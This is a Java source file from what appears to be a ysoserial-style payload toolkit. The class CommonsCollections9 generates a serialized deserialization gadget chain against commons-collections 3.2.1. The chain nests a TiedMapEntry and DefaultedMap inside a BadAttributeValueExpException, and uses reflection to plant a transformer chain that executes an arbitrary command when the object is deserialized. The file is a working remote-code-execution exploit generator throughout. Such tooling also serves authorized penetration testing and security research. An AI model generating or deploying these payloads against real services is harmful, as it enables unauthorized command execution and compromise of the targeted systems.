package com.h2tg.ysogate.payloads.gadgets;

import java.util.HashMap;
import java.util.Map;
import javax.management.BadAttributeValueExpException;

import com.h2tg.ysogate.utils.Gadgets;
import com.h2tg.ysogate.utils.PayloadRunner;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.DefaultedMap;
import com.h2tg.ysogate.payloads.ObjectPayload;
import com.h2tg.ysogate.annotation.Dependencies;
import com.h2tg.ysogate.utils.JavaVersion;
import com.h2tg.ysogate.utils.Reflections;

@Dependencies({"commons-collections:commons-collections:3.2.1"})
public class CommonsCollections9 implements ObjectPayload<BadAttributeValueExpException> {

	public BadAttributeValueExpException getObject(String command) throws Exception {
		ChainedTransformer            chainedTransformer = new ChainedTransformer(new Transformer[]{(Transformer) new ConstantTransformer(Integer.valueOf(1))});
		Transformer[]                 transformers       = Gadgets.makeTransformer(command);
		Map<Object, Object>           innerMap           = new HashMap<Object, Object>();
		Map                           defaultedmap       = DefaultedMap.decorate(innerMap, (Transformer) chainedTransformer);
		TiedMapEntry                  entry              = new TiedMapEntry(defaultedmap, "su18");
		BadAttributeValueExpException val                = new BadAttributeValueExpException(null);
		Reflections.setFieldValue(val, "val", entry);
		Reflections.setFieldValue(chainedTransformer, "iTransformers", transformers);
		return val;
	}

	public static void main(final String[] args) throws Exception {
		PayloadRunner.run(CommonsCollections9.class, args);
	}
	public static boolean isApplicableJavaVersion() {
		return JavaVersion.isBadAttrValExcReadObj();
	}
}
